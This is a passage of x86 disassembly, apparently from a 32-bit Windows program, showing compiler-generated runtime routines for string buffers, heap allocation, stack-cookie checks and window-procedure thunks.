  405425:	mov    eax,DWORD PTR [ebx]
  405427:	mov    ecx,DWORD PTR [ebp+0x8]
  40542a:	sub    ecx,eax
  40542c:	sar    ecx,1
  40542e:	push   esi
  40542f:	mov    esi,DWORD PTR [eax-0xc]
  405432:	mov    DWORD PTR [ebp-0x4],ecx
  405435:	mov    ecx,ebx
  405437:	push   edi
  405438:	call   0x4053a6
  40543d:	mov    ecx,DWORD PTR [ebp-0x4]
  405440:	cmp    ecx,esi
  405442:	mov    DWORD PTR [ebp-0x8],eax
  405445:	pop    esi
  405446:	ja     0x40545a
  405448:	lea    edx,[edi+edi*1]
  40544b:	push   edx
  40544c:	lea    ecx,[eax+ecx*2]
  40544f:	push   ecx
  405450:	push   edx
  405451:	push   eax
  405452:	call   DWORD PTR ds:0x40922c
  405458:	jmp    0x40546b
  40545a:	lea    eax,[edi+edi*1]
  40545d:	push   eax
  40545e:	push   DWORD PTR [ebp+0x8]
  405461:	push   eax
  405462:	push   DWORD PTR [ebp-0x8]
  405465:	call   DWORD PTR ds:0x409230
  40546b:	add    esp,0x10
  40546e:	mov    ecx,ebx
  405470:	push   edi
  405471:	call   0x4053d4
  405476:	pop    edi
  405477:	pop    ebx
  405478:	mov    esp,ebp
  40547a:	pop    ebp
  40547b:	ret    0x8
  40547e:	mov    ecx,0x80070057
  405483:	call   0x4046c7
  405488:	int3   
  405489:	int3   
  40548a:	int3   
  40548b:	int3   
  40548c:	int3   
  40548d:	int3   
  40548e:	mov    ecx,0x8007000e
  405493:	jmp    0x4046c7
  405498:	int3   
  405499:	int3   
  40549a:	int3   
  40549b:	int3   
  40549c:	int3   
  40549d:	mov    edi,edi
  40549f:	push   ebp
  4054a0:	mov    ebp,esp
  4054a2:	push   ecx
  4054a3:	mov    eax,ds:0x408008
  4054a8:	xor    eax,ebp
  4054aa:	mov    DWORD PTR [ebp-0x4],eax
  4054ad:	push   ebx
  4054ae:	mov    ebx,ecx
  4054b0:	push   esi
  4054b1:	push   edi
  4054b2:	mov    edi,DWORD PTR [ebx]
  4054b4:	mov    eax,DWORD PTR [edi]
  4054b6:	mov    esi,DWORD PTR [eax+0x10]
  4054b9:	mov    ecx,esi
  4054bb:	call   DWORD PTR ds:0x409254
  4054c1:	mov    ecx,edi
  4054c3:	call   esi
  4054c5:	mov    edi,eax
  4054c7:	lea    eax,[ebx+0xc]
  4054ca:	cmp    DWORD PTR [eax],0x0
  4054cd:	jl     0x4054da
  4054cf:	cmp    edi,DWORD PTR [ebx]
  4054d1:	jne    0x4054da
  4054d3:	mov    esi,ebx
  4054d5:	lock inc DWORD PTR [eax]
  4054d8:	jmp    0x405518
  4054da:	mov    eax,DWORD PTR [edi]
  4054dc:	push   0x2
  4054de:	push   DWORD PTR [ebx+0x4]
  4054e1:	mov    esi,DWORD PTR [eax]
  4054e3:	mov    ecx,esi
  4054e5:	call   DWORD PTR ds:0x409254
  4054eb:	mov    ecx,edi
  4054ed:	call   esi
  4054ef:	mov    esi,eax
  4054f1:	test   esi,esi
  4054f3:	je     0x40552b
  4054f5:	mov    eax,DWORD PTR [ebx+0x4]
  4054f8:	mov    DWORD PTR [esi+0x4],eax
  4054fb:	mov    eax,DWORD PTR [ebx+0x4]
  4054fe:	lea    ecx,[eax*2+0x2]
  405505:	push   ecx
  405506:	lea    eax,[ebx+0x10]
  405509:	push   eax
  40550a:	push   ecx
  40550b:	lea    eax,[esi+0x10]
  40550e:	push   eax
  40550f:	call   DWORD PTR ds:0x409230
  405515:	add    esp,0x10
  405518:	mov    ecx,DWORD PTR [ebp-0x4]
  40551b:	mov    eax,esi
  40551d:	pop    edi
  40551e:	pop    esi
  40551f:	xor    ecx,ebp
  405521:	pop    ebx
  405522:	call   0x4071f0
  405527:	mov    esp,ebp
  405529:	pop    ebp
  40552a:	ret    
  40552b:	call   0x40548e
  405530:	int3   
  405531:	int3   
  405532:	int3   
  405533:	int3   
  405534:	int3   
  405535:	int3   
  405536:	mov    edi,edi
  405538:	push   ebp
  405539:	mov    ebp,esp
  40553b:	push   ecx
  40553c:	mov    eax,ds:0x408008
  405541:	xor    eax,ebp
  405543:	mov    DWORD PTR [ebp-0x4],eax
  405546:	or     eax,0xffffffff
  405549:	lock xadd DWORD PTR [ecx+0xc],eax
  40554e:	dec    eax
  40554f:	test   eax,eax
  405551:	jg     0x40556b
  405553:	push   esi
  405554:	push   edi
  405555:	mov    edi,DWORD PTR [ecx]
  405557:	push   ecx
  405558:	mov    eax,DWORD PTR [edi]
  40555a:	mov    esi,DWORD PTR [eax+0x4]
  40555d:	mov    ecx,esi
  40555f:	call   DWORD PTR ds:0x409254
  405565:	mov    ecx,edi
  405567:	call   esi
  405569:	pop    edi
  40556a:	pop    esi
  40556b:	mov    ecx,DWORD PTR [ebp-0x4]
  40556e:	xor    ecx,ebp
  405570:	call   0x4071f0
  405575:	mov    esp,ebp
  405577:	pop    ebp
  405578:	ret    
  405579:	int3   
  40557a:	int3   
  40557b:	int3   
  40557c:	int3   
  40557d:	int3   
  40557e:	mov    edi,edi
  405580:	push   edi
  405581:	xor    eax,eax
  405583:	mov    edx,0x408474
  405588:	push   0x6
  40558a:	pop    ecx
  40558b:	mov    edi,edx
  40558d:	rep stos DWORD PTR es:[edi],eax
  40558f:	mov    ds:0x40848c,eax
  405594:	mov    ecx,edx
  405596:	mov    ds:0x408490,eax
  40559b:	mov    ds:0x408494,eax
  4055a0:	mov    eax,0x400000
  4055a5:	mov    DWORD PTR ds:0x40845c,0x3c
  4055af:	mov    ds:0x408464,eax
  4055b4:	mov    ds:0x408460,eax
  4055b9:	mov    BYTE PTR ds:0x408468,0x1
  4055c0:	mov    DWORD PTR ds:0x40846c,0x800
  4055ca:	mov    DWORD PTR ds:0x408470,0x4017c4
  4055d4:	call   0x40256f
  4055d9:	pop    edi
  4055da:	test   eax,eax
  4055dc:	jns    0x4055e5
  4055de:	mov    BYTE PTR ds:0x4083d0,0x1
  4055e5:	mov    eax,0x40845c
  4055ea:	ret    
  4055eb:	int3   
  4055ec:	int3   
  4055ed:	int3   
  4055ee:	int3   
  4055ef:	int3   
  4055f0:	mov    eax,ds:0x40848c
  4055f5:	test   eax,eax
  4055f7:	je     0x405608
  4055f9:	push   eax
  4055fa:	call   DWORD PTR ds:0x40923c
  405600:	and    DWORD PTR ds:0x40848c,0x0
  405607:	pop    ecx
  405608:	and    DWORD PTR ds:0x408490,0x0
  40560f:	and    DWORD PTR ds:0x408494,0x0
  405616:	ret    
  405617:	int3   
  405618:	int3   
  405619:	int3   
  40561a:	int3   
  40561b:	int3   
  40561c:	mov    edi,edi
  40561e:	push   ebp
  40561f:	mov    ebp,esp
  405621:	push   esi
  405622:	push   edi
  405623:	mov    edi,0x408474
  405628:	push   edi
  405629:	call   DWORD PTR ds:0x409028
  40562f:	mov    ecx,DWORD PTR [ebp+0x8]
  405632:	mov    eax,ds:0x408490
  405637:	cmp    ecx,eax
  405639:	jg     0x405657
  40563b:	test   ecx,ecx
  40563d:	js     0x405657
  40563f:	cmp    ecx,eax
  405641:	jne    0x40564b
  405643:	mov    esi,DWORD PTR ds:0x408464
  405649:	jmp    0x405659
  40564b:	jge    0x405668
  40564d:	mov    eax,ds:0x40848c
  405652:	mov    esi,DWORD PTR [eax+ecx*4]
  405655:	jmp    0x405659
  405657:	xor    esi,esi
  405659:	push   edi
  40565a:	call   DWORD PTR ds:0x409078
  405660:	pop    edi
  405661:	mov    eax,esi
  405663:	pop    esi
  405664:	pop    ebp
  405665:	ret    0x4
  405668:	mov    ecx,0xc000008c
  40566d:	call   0x4046b4
  405672:	int3   
  405673:	int3   
  405674:	int3   
  405675:	int3   
  405676:	int3   
  405677:	int3   
  405678:	mov    eax,ds:0x408010
  40567d:	push   edi
  40567e:	mov    edi,edx
  405680:	test   eax,eax
  405682:	je     0x4056f8
  405684:	cmp    eax,0x2c
  405687:	je     0x405690
  405689:	mov    eax,0x80070057
  40568e:	pop    edi
  40568f:	ret    
  405690:	mov    eax,ds:0x408034
  405695:	push   ebx
  405696:	xor    ebx,ebx
  405698:	push   esi
  405699:	mov    esi,ebx
  40569b:	test   eax,eax
  40569d:	jle    0x4056c2
  40569f:	test   esi,esi
  4056a1:	js     0x4056fc
  4056a3:	cmp    esi,eax
  4056a5:	jge    0x4056fc
  4056a7:	mov    eax,ds:0x408030
  4056ac:	push   edi
  4056ad:	movzx  eax,WORD PTR [eax+esi*2]
  4056b1:	push   eax
  4056b2:	call   DWORD PTR ds:0x4090f4
  4056b8:	mov    eax,ds:0x408034
  4056bd:	inc    esi
  4056be:	cmp    esi,eax
  4056c0:	jl     0x40569f
  4056c2:	mov    eax,ds:0x408030
  4056c7:	test   eax,eax
  4056c9:	je     0x4056d9
  4056cb:	push   eax
  4056cc:	call   DWORD PTR ds:0x40923c
  4056d2:	pop    ecx
  4056d3:	mov    DWORD PTR ds:0x408030,ebx
  4056d9:	push   0x408014
  4056de:	mov    DWORD PTR ds:0x408034,ebx
  4056e4:	mov    DWORD PTR ds:0x408038,ebx
  4056ea:	call   DWORD PTR ds:0x40903c
  4056f0:	pop    esi
  4056f1:	mov    DWORD PTR ds:0x408010,ebx
  4056f7:	pop    ebx
  4056f8:	xor    eax,eax
  4056fa:	pop    edi
  4056fb:	ret    
  4056fc:	mov    ecx,0xc000008c
  405701:	call   0x4046b4
  405706:	int3   
  405707:	int3   
  405708:	int3   
  405709:	int3   
  40570a:	int3   
  40570b:	int3   
  40570c:	mov    eax,ds:0x408030
  405711:	test   eax,eax
  405713:	je     0x405724
  405715:	push   eax
  405716:	call   DWORD PTR ds:0x40923c
  40571c:	and    DWORD PTR ds:0x408030,0x0
  405723:	pop    ecx
  405724:	and    DWORD PTR ds:0x408034,0x0
  40572b:	and    DWORD PTR ds:0x408038,0x0
  405732:	ret    
  405733:	int3   
  405734:	int3   
  405735:	int3   
  405736:	int3   
  405737:	int3   
  405738:	int3   
  405739:	int3   
  40573a:	int3   
  40573b:	int3   
  40573c:	int3   
  40573d:	int3   
  40573e:	int3   
  40573f:	int3   
  405740:	mov    edi,edi
  405742:	push   ebp
  405743:	mov    ebp,esp
  405745:	mov    edx,DWORD PTR [ebp+0x8]
  405748:	push   esi
  405749:	push   edi
  40574a:	mov    edi,ecx
  40574c:	test   edx,edx
  40574e:	js     0x4057ab
  405750:	mov    eax,0x7fffffff
  405755:	sub    eax,edx
  405757:	cmp    eax,0x1
  40575a:	jl     0x4057ab
  40575c:	inc    edx
  40575d:	lea    esi,[edx+0x7]
  405760:	and    esi,0xfffffff8
  405763:	cmp    edx,esi
  405765:	jg     0x4057ab
  405767:	mov    eax,esi
  405769:	mul    DWORD PTR [ebp+0xc]
  40576c:	test   edx,edx
  40576e:	ja     0x4057ab
  405770:	jb     0x405777
  405772:	cmp    eax,0xffffffff
  405775:	ja     0x4057ab
  405777:	cmp    eax,0xffffffef
  40577a:	ja     0x4057ab
  40577c:	mov    ecx,DWORD PTR [edi+0x4]
  40577f:	add    eax,0x10
  405782:	push   eax
  405783:	push   0x0
  405785:	push   DWORD PTR [ecx+0x4]
  405788:	call   DWORD PTR ds:0x409148
  40578e:	mov    ecx,eax
  405790:	test   ecx,ecx
  405792:	je     0x4057ab
  405794:	and    DWORD PTR [ecx+0x4],0x0
  405798:	lea    eax,[esi-0x1]
  40579b:	mov    DWORD PTR [ecx+0x8],eax
  40579e:	mov    eax,ecx
  4057a0:	mov    DWORD PTR [ecx],edi
  4057a2:	mov    DWORD PTR [ecx+0xc],0x1
  4057a9:	jmp    0x4057ad
  4057ab:	xor    eax,eax
  4057ad:	pop    edi
  4057ae:	pop    esi
  4057af:	pop    ebp
  4057b0:	ret    0x8
  4057b3:	int3   
  4057b4:	int3   
  4057b5:	int3   
  4057b6:	int3   
  4057b7:	int3   
  4057b8:	int3   
  4057b9:	int3   
  4057ba:	int3   
  4057bb:	int3   
  4057bc:	int3   
  4057bd:	int3   
  4057be:	int3   
  4057bf:	int3   
  4057c0:	mov    edi,edi
  4057c2:	push   ebp
  4057c3:	mov    ebp,esp
  4057c5:	cmp    DWORD PTR [ebp+0x8],0x0
  4057c9:	je     0x4057dc
  4057cb:	push   DWORD PTR [ebp+0x8]
  4057ce:	mov    eax,DWORD PTR [ecx+0x4]
  4057d1:	push   0x0
  4057d3:	push   DWORD PTR [eax+0x4]
  4057d6:	call   DWORD PTR ds:0x40913c
  4057dc:	pop    ebp
  4057dd:	ret    0x4
  4057e0:	int3   
  4057e1:	int3   
  4057e2:	int3   
  4057e3:	int3   
  4057e4:	int3   
  4057e5:	int3   
  4057e6:	int3   
  4057e7:	int3   
  4057e8:	int3   
  4057e9:	int3   
  4057ea:	int3   
  4057eb:	int3   
  4057ec:	int3   
  4057ed:	int3   
  4057ee:	int3   
  4057ef:	int3   
  4057f0:	mov    edi,edi
  4057f2:	push   ebp
  4057f3:	mov    ebp,esp
  4057f5:	mov    edx,DWORD PTR [ebp+0xc]
  4057f8:	push   esi
  4057f9:	test   edx,edx
  4057fb:	js     0x405848
  4057fd:	mov    eax,0x7fffffff
  405802:	sub    eax,edx
  405804:	cmp    eax,0x1
  405807:	jl     0x405848
  405809:	inc    edx
  40580a:	lea    esi,[edx+0x7]
  40580d:	and    esi,0xfffffff8
  405810:	cmp    edx,esi
  405812:	jg     0x405848
  405814:	mov    eax,esi
  405816:	mul    DWORD PTR [ebp+0x10]
  405819:	test   edx,edx
  40581b:	ja     0x405848
  40581d:	jb     0x405824
  40581f:	cmp    eax,0xffffffff
  405822:	ja     0x405848
  405824:	cmp    eax,0xffffffef
  405827:	ja     0x405848
  405829:	mov    ecx,DWORD PTR [ecx+0x4]
  40582c:	add    eax,0x10
  40582f:	push   eax
  405830:	push   DWORD PTR [ebp+0x8]
  405833:	call   0x405920
  405838:	mov    ecx,eax
  40583a:	test   ecx,ecx
  40583c:	je     0x405848
  40583e:	lea    eax,[esi-0x1]
  405841:	mov    DWORD PTR [ecx+0x8],eax
  405844:	mov    eax,ecx
  405846:	jmp    0x40584a
  405848:	xor    eax,eax
  40584a:	pop    esi
  40584b:	pop    ebp
  40584c:	ret    0xc
  40584f:	int3   
  405850:	int3   
  405851:	int3   
  405852:	int3   
  405853:	int3   
  405854:	int3   
  405855:	int3   
  405856:	int3   
  405857:	int3   
  405858:	int3   
  405859:	int3   
  40585a:	int3   
  40585b:	int3   
  40585c:	int3   
  40585d:	int3   
  40585e:	int3   
  40585f:	int3   
  405860:	mov    edi,edi
  405862:	lock inc DWORD PTR [ecx+0x14]
  405866:	lea    eax,[ecx+0x8]
  405869:	ret    
  40586a:	int3   
  40586b:	int3   
  40586c:	int3   
  40586d:	int3   
  40586e:	int3   
  40586f:	int3   
  405870:	mov    eax,ecx
  405872:	ret    
  405873:	int3   
  405874:	int3   
  405875:	int3   
  405876:	int3   
  405877:	int3   
  405878:	int3   
  405879:	int3   
  40587a:	int3   
  40587b:	int3   
  40587c:	int3   
  40587d:	int3   
  40587e:	int3   
  40587f:	int3   
  405880:	mov    edi,edi
  405882:	push   ebp
  405883:	mov    ebp,esp
  405885:	test   BYTE PTR [ebp+0x8],0x1
  405889:	push   esi
  40588a:	mov    esi,ecx
  40588c:	mov    DWORD PTR [esi],0x401418
  405892:	je     0x40589b
  405894:	push   esi
  405895:	call   0x406e3c
  40589a:	pop    ecx
  40589b:	mov    eax,esi
  40589d:	pop    esi
  40589e:	pop    ebp
  40589f:	ret    0x4
  4058a2:	int3   
  4058a3:	int3   
  4058a4:	int3   
  4058a5:	int3   
  4058a6:	int3   
  4058a7:	cmp    BYTE PTR [ecx+0x8],0x0
  4058ab:	mov    DWORD PTR [ecx],0x401430
  4058b1:	je     0x4058c2
  4058b3:	cmp    DWORD PTR [ecx+0x4],0x0
  4058b7:	je     0x4058c2
  4058b9:	push   DWORD PTR [ecx+0x4]
  4058bc:	call   DWORD PTR ds:0x409150
  4058c2:	ret    
  4058c3:	int3   
  4058c4:	int3   
  4058c5:	int3   
  4058c6:	int3   
  4058c7:	int3   
  4058c8:	int3   
  4058c9:	int3   
  4058ca:	int3   
  4058cb:	int3   
  4058cc:	int3   
  4058cd:	int3   
  4058ce:	int3   
  4058cf:	int3   
  4058d0:	mov    edi,edi
  4058d2:	push   ebp
  4058d3:	mov    ebp,esp
  4058d5:	push   DWORD PTR [ebp+0x8]
  4058d8:	push   0x0
  4058da:	push   DWORD PTR [ecx+0x4]
  4058dd:	call   DWORD PTR ds:0x409148
  4058e3:	pop    ebp
  4058e4:	ret    0x4
  4058e7:	int3   
  4058e8:	int3   
  4058e9:	int3   
  4058ea:	int3   
  4058eb:	int3   
  4058ec:	int3   
  4058ed:	int3   
  4058ee:	int3   
  4058ef:	int3   
  4058f0:	mov    edi,edi
  4058f2:	push   ebp
  4058f3:	mov    ebp,esp
  4058f5:	cmp    DWORD PTR [ebp+0x8],0x0
  4058f9:	je     0x405909
  4058fb:	push   DWORD PTR [ebp+0x8]
  4058fe:	push   0x0
  405900:	push   DWORD PTR [ecx+0x4]
  405903:	call   DWORD PTR ds:0x40913c
  405909:	pop    ebp
  40590a:	ret    0x4
  40590d:	int3   
  40590e:	int3   
  40590f:	int3   
  405910:	int3   
  405911:	int3   
  405912:	int3   
  405913:	int3   
  405914:	int3   
  405915:	int3   
  405916:	int3   
  405917:	int3   
  405918:	int3   
  405919:	int3   
  40591a:	int3   
  40591b:	int3   
  40591c:	int3   
  40591d:	int3   
  40591e:	int3   
  40591f:	int3   
  405920:	mov    edi,edi
  405922:	push   ebp
  405923:	mov    ebp,esp
  405925:	mov    eax,DWORD PTR [ebp+0x8]
  405928:	test   eax,eax
  40592a:	jne    0x40593b
  40592c:	push   DWORD PTR [ebp+0xc]
  40592f:	push   eax
  405930:	push   DWORD PTR [ecx+0x4]
  405933:	call   DWORD PTR ds:0x409148
  405939:	jmp    0x405960
  40593b:	cmp    DWORD PTR [ebp+0xc],0x0
  40593f:	jne    0x405951
  405941:	push   eax
  405942:	push   0x0
  405944:	push   DWORD PTR [ecx+0x4]
  405947:	call   DWORD PTR ds:0x40913c
  40594d:	xor    eax,eax
  40594f:	jmp    0x405960
  405951:	push   DWORD PTR [ebp+0xc]
  405954:	push   eax
  405955:	push   0x0
  405957:	push   DWORD PTR [ecx+0x4]
  40595a:	call   DWORD PTR ds:0x409140
  405960:	pop    ebp
  405961:	ret    0x8
  405964:	int3   
  405965:	int3   
  405966:	int3   
  405967:	int3   
  405968:	int3   
  405969:	int3   
  40596a:	int3   
  40596b:	int3   
  40596c:	int3   
  40596d:	int3   
  40596e:	int3   
  40596f:	int3   
  405970:	mov    edi,edi
  405972:	push   ebp
  405973:	mov    ebp,esp
  405975:	push   DWORD PTR [ebp+0x8]
  405978:	push   0x0
  40597a:	push   DWORD PTR [ecx+0x4]
  40597d:	call   DWORD PTR ds:0x409144
  405983:	pop    ebp
  405984:	ret    0x4
  405987:	int3   
  405988:	int3   
  405989:	int3   
  40598a:	int3   
  40598b:	int3   
  40598c:	int3   
  40598d:	int3   
  40598e:	int3   
  40598f:	int3   
  405990:	mov    edi,edi
  405992:	push   ebp
  405993:	mov    ebp,esp
  405995:	push   esi
  405996:	mov    esi,ecx
  405998:	call   0x4058a7
  40599d:	test   BYTE PTR [ebp+0x8],0x1
  4059a1:	je     0x4059aa
  4059a3:	push   esi
  4059a4:	call   0x406e3c
  4059a9:	pop    ecx
  4059aa:	mov    eax,esi
  4059ac:	pop    esi
  4059ad:	pop    ebp
  4059ae:	ret    0x4
  4059b1:	int3   
  4059b2:	int3   
  4059b3:	int3   
  4059b4:	int3   
  4059b5:	int3   
  4059b6:	mov    eax,ds:0x408404
  4059bb:	push   esi
  4059bc:	test   eax,eax
  4059be:	jne    0x4059ce
  4059c0:	call   0x405a83
  4059c5:	test   eax,eax
  4059c7:	je     0x405a0c
  4059c9:	mov    eax,ds:0x408404
  4059ce:	cmp    eax,0x1
  4059d1:	jne    0x4059ea
  4059d3:	push   0xd
  4059d5:	push   0x0
  4059d7:	call   DWORD PTR ds:0x40914c
  4059dd:	push   eax
  4059de:	call   DWORD PTR ds:0x409148
  4059e4:	test   eax,eax
  4059e6:	je     0x405a0c
  4059e8:	pop    esi
  4059e9:	ret    
  4059ea:	push   eax
  4059eb:	call   DWORD PTR ds:0x409158
  4059f1:	test   eax,eax
  4059f3:	jne    0x405a54
  4059f5:	push   0x40
  4059f7:	mov    eax,0x1000
  4059fc:	push   eax
  4059fd:	push   eax
  4059fe:	push   0x0
  405a00:	call   DWORD PTR ds:0x409170
  405a06:	mov    esi,eax
  405a08:	test   esi,esi
  405a0a:	jne    0x405a10
  405a0c:	xor    eax,eax
  405a0e:	pop    esi
  405a0f:	ret    
  405a10:	mov    eax,DWORD PTR [esi]
  405a12:	push   edi
  405a13:	push   DWORD PTR ds:0x408404
  405a19:	call   DWORD PTR ds:0x409158
  405a1f:	mov    edi,eax
  405a21:	test   edi,edi
  405a23:	je     0x405a37
  405a25:	push   0x8000
  405a2a:	push   0x0
  405a2c:	push   esi
  405a2d:	call   DWORD PTR ds:0x409174
  405a33:	mov    eax,edi
  405a35:	jmp    0x405a53
  405a37:	lea    edi,[esi+0xff0]
  405a3d:	push   esi
  405a3e:	push   DWORD PTR ds:0x408404
  405a44:	call   DWORD PTR ds:0x40915c
  405a4a:	add    esi,0x10
  405a4d:	cmp    esi,edi
  405a4f:	jb     0x405a3d
  405a51:	mov    eax,esi
  405a53:	pop    edi
  405a54:	pop    esi
  405a55:	ret    
  405a56:	int3   
  405a57:	int3   
  405a58:	int3   
  405a59:	int3   
  405a5a:	int3   
  405a5b:	mov    eax,ds:0x408404
  405a60:	push   ecx
  405a61:	cmp    eax,0x1
  405a64:	jne    0x405a76
  405a66:	push   0x0
  405a68:	call   DWORD PTR ds:0x40914c
  405a6e:	push   eax
  405a6f:	call   DWORD PTR ds:0x40913c
  405a75:	ret    
  405a76:	push   eax
  405a77:	call   DWORD PTR ds:0x40915c
  405a7d:	ret    
  405a7e:	int3   
  405a7f:	int3   
  405a80:	int3   
  405a81:	int3   
  405a82:	int3   
  405a83:	push   0xc
  405a85:	call   DWORD PTR ds:0x409180
  405a8b:	test   eax,eax
  405a8d:	jne    0x405a96
  405a8f:	inc    eax
  405a90:	mov    ds:0x408404,eax
  405a95:	ret    
  405a96:	push   esi
  405a97:	mov    esi,DWORD PTR fs:0x30
  405a9e:	add    esi,0x34
  405aa1:	mov    eax,DWORD PTR [esi]
  405aa3:	test   eax,eax
  405aa5:	jne    0x405adc
  405aa7:	push   0x8
  405aa9:	push   0x8
  405aab:	call   DWORD PTR ds:0x40914c
  405ab1:	push   eax
  405ab2:	call   DWORD PTR ds:0x409148
  405ab8:	mov    edx,eax
  405aba:	xor    eax,eax
  405abc:	test   edx,edx
  405abe:	je     0x405ae4
  405ac0:	mov    ecx,edx
  405ac2:	lock cmpxchg DWORD PTR [esi],ecx
  405ac6:	test   eax,eax
  405ac8:	je     0x405ada
  405aca:	push   edx
  405acb:	push   0x0
  405acd:	call   DWORD PTR ds:0x40914c
  405ad3:	push   eax
  405ad4:	call   DWORD PTR ds:0x40913c
  405ada:	mov    eax,DWORD PTR [esi]
  405adc:	mov    ds:0x408404,eax
  405ae1:	xor    eax,eax
  405ae3:	inc    eax
  405ae4:	pop    esi
  405ae5:	ret    
  405ae6:	int3   
  405ae7:	int3   
  405ae8:	int3   
  405ae9:	int3   
  405aea:	int3   
  405aeb:	mov    edi,edi
  405aed:	push   ebp
  405aee:	mov    ebp,esp
  405af0:	push   edx
  405af1:	push   ecx
  405af2:	call   DWORD PTR ds:0x409030
  405af8:	test   eax,eax
  405afa:	jne    0x405b00
  405afc:	xor    al,al
  405afe:	jmp    0x405b0e
  405b00:	push   eax
  405b01:	call   DWORD PTR ds:0x4091bc
  405b07:	mov    ecx,DWORD PTR [ebp+0x8]
  405b0a:	mov    DWORD PTR [ecx],eax
  405b0c:	mov    al,0x1
  405b0e:	pop    ebp
  405b0f:	ret    0x4
  405b12:	int3   
  405b13:	int3   
  405b14:	int3   
  405b15:	int3   
  405b16:	int3   
  405b17:	mov    edi,edi
  405b19:	push   ebp
  405b1a:	mov    ebp,esp
  405b1c:	push   ecx
  405b1d:	mov    eax,ds:0x408008
  405b22:	xor    eax,ebp
  405b24:	mov    DWORD PTR [ebp-0x4],eax
  405b27:	push   esi
  405b28:	mov    esi,DWORD PTR [ebp+0x8]
  405b2b:	push   edi
  405b2c:	test   esi,esi
  405b2e:	je     0x405b5d
  405b30:	mov    eax,DWORD PTR [esi+0x4]
  405b33:	test   eax,eax
  405b35:	je     0x405b5d
  405b37:	xor    edi,edi
  405b39:	cmp    DWORD PTR [esi],edi
  405b3b:	jne    0x405b5f
  405b3d:	push   ebx
  405b3e:	call   0x405ce9
  405b43:	mov    ebx,eax
  405b45:	test   ebx,ebx
  405b47:	je     0x405b58
  405b49:	push   DWORD PTR [esi+0x4]
  405b4c:	mov    ecx,ebx
  405b4e:	call   DWORD PTR ds:0x409254
  405b54:	call   ebx
  405b56:	mov    edi,eax
  405b58:	mov    eax,edi
  405b5a:	pop    ebx
  405b5b:	jmp    0x405b5f
  405b5d:	xor    eax,eax
  405b5f:	mov    ecx,DWORD PTR [ebp-0x4]
  405b62:	pop    edi
  405b63:	xor    ecx,ebp
  405b65:	pop    esi
  405b66:	call   0x4071f0
  405b6b:	mov    esp,ebp
  405b6d:	pop    ebp
  405b6e:	ret    0x4
  405b71:	int3   
  405b72:	int3   
  405b73:	int3   
  405b74:	int3   
  405b75:	int3   
  405b76:	mov    edi,edi
  405b78:	push   ebp
  405b79:	mov    ebp,esp
  405b7b:	push   ecx
  405b7c:	mov    eax,ds:0x408008
  405b81:	xor    eax,ebp
  405b83:	mov    DWORD PTR [ebp-0x4],eax
  405b86:	push   esi
  405b87:	push   0x8
  405b89:	push   0x8
  405b8b:	call   DWORD PTR ds:0x40914c
  405b91:	push   eax
  405b92:	call   DWORD PTR ds:0x409148
  405b98:	mov    esi,eax
  405b9a:	test   esi,esi
  405b9c:	jne    0x405ba2
  405b9e:	xor    eax,eax
  405ba0:	jmp    0x405be3
  405ba2:	push   edi
  405ba3:	call   0x405d9f
  405ba8:	xor    ecx,ecx
  405baa:	mov    edi,eax
  405bac:	test   edi,edi
  405bae:	sete   cl
  405bb1:	mov    DWORD PTR [esi],ecx
  405bb3:	test   edi,edi
  405bb5:	je     0x405bc3
  405bb7:	mov    ecx,edi
  405bb9:	call   DWORD PTR ds:0x409254
  405bbf:	call   edi
  405bc1:	jmp    0x405bc8
  405bc3:	call   0x4059b6
  405bc8:	mov    DWORD PTR [esi+0x4],eax
  405bcb:	pop    edi
  405bcc:	test   eax,eax
  405bce:	jne    0x405be1
  405bd0:	push   esi
  405bd1:	push   eax
  405bd2:	call   DWORD PTR ds:0x40914c
  405bd8:	push   eax
  405bd9:	call   DWORD PTR ds:0x40913c
  405bdf:	jmp    0x405b9e
  405be1:	mov    eax,esi
  405be3:	mov    ecx,DWORD PTR [ebp-0x4]
  405be6:	xor    ecx,ebp
  405be8:	pop    esi
  405be9:	call   0x4071f0
  405bee:	mov    esp,ebp
  405bf0:	pop    ebp
  405bf1:	ret    
  405bf2:	int3   
  405bf3:	int3   
  405bf4:	int3   
  405bf5:	int3   
  405bf6:	int3   
  405bf7:	mov    edi,edi
  405bf9:	push   ebp
  405bfa:	mov    ebp,esp
  405bfc:	push   ecx
  405bfd:	mov    eax,ds:0x408008
  405c02:	xor    eax,ebp
  405c04:	mov    DWORD PTR [ebp-0x4],eax
  405c07:	push   esi
  405c08:	mov    esi,DWORD PTR [ebp+0x8]
  405c0b:	test   esi,esi
  405c0d:	je     0x405c68
  405c0f:	mov    ecx,DWORD PTR [esi+0x4]
  405c12:	test   ecx,ecx
  405c14:	je     0x405c68
  405c16:	cmp    DWORD PTR [esi],0x0
  405c19:	je     0x405c48
  405c1b:	mov    eax,DWORD PTR [ebp+0x10]
  405c1e:	mov    DWORD PTR [ecx+0x4],eax
  405c21:	mov    eax,DWORD PTR [ebp+0xc]
  405c24:	sub    eax,ecx
  405c26:	mov    DWORD PTR [ecx],0x42444c7
  405c2c:	push   0xd
  405c2e:	sub    eax,0xd
  405c31:	mov    BYTE PTR [ecx+0x8],0xe9
  405c35:	push   ecx
  405c36:	mov    DWORD PTR [ecx+0x9],eax
  405c39:	call   DWORD PTR ds:0x40917c
  405c3f:	push   eax
  405c40:	call   DWORD PTR ds:0x409184
  405c46:	jmp    0x405c68
  405c48:	push   edi
  405c49:	call   0x405e55
  405c4e:	mov    edi,eax
  405c50:	test   edi,edi
  405c52:	je     0x405c67
  405c54:	push   DWORD PTR [ebp+0x10]
  405c57:	mov    ecx,edi
  405c59:	push   DWORD PTR [ebp+0xc]
  405c5c:	push   DWORD PTR [esi+0x4]
  405c5f:	call   DWORD PTR ds:0x409254
  405c65:	call   edi
  405c67:	pop    edi
  405c68:	mov    ecx,DWORD PTR [ebp-0x4]
  405c6b:	xor    ecx,ebp
  405c6d:	pop    esi
  405c6e:	call   0x4071f0
  405c73:	mov    esp,ebp
  405c75:	pop    ebp
  405c76:	ret    0xc
  405c79:	int3   
  405c7a:	int3   
  405c7b:	int3   
  405c7c:	int3   
  405c7d:	int3   
  405c7e:	mov    edi,edi
  405c80:	push   ebp
  405c81:	mov    ebp,esp
  405c83:	push   ecx
  405c84:	mov    eax,ds:0x408008
  405c89:	xor    eax,ebp
  405c8b:	mov    DWORD PTR [ebp-0x4],eax
  405c8e:	push   esi
  405c8f:	mov    esi,DWORD PTR [ebp+0x8]
  405c92:	test   esi,esi
  405c94:	je     0x405cd3
  405c96:	mov    ecx,DWORD PTR [esi+0x4]
  405c99:	test   ecx,ecx
  405c9b:	je     0x405cc3
  405c9d:	cmp    DWORD PTR [esi],0x0
